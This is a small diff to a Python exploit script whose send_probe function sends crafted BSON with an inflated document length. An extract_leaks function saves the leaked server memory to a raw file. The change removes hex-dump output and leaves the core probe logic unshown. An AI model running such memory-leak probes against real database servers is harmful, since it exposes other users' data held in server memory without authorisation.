@@ -14,8 +14,6 @@ import struct
 import zlib
 import re
 import argparse
-import binascii
-from datetime import datetime
 
 def send_probe(host, port, doc_len, buffer_size):
     """Send crafted BSON with inflated document length"""
@@ -52,8 +50,8 @@ def send_probe(host, port, doc_len, buffer_size):
     except:
         return b''
 
-def extract_leaks(response, raw_file="leaks.raw", hex_file="leaks.hex"):
-    """Extract leaked data and store all raw buffers in .raw and .hex files"""
+def extract_leaks(response, raw_file="leaks.raw"):
+    """Extract leaked data and store all raw buffers in .raw"""
     if len(response) < 25:
         return []
 
@@ -69,10 +67,6 @@ def extract_leaks(response, raw_file="leaks.raw", hex_file="leaks.hex"):
     # === Store RAW bytes ===
     with open(raw_file, "ab") as f:
         f.write(raw)
-
-    # === Store HEX representation ===
-    with open(hex_file, "ab") as f:
-        f.write(binascii.hexlify(raw) + b"\n")
 
     leaks = []
 
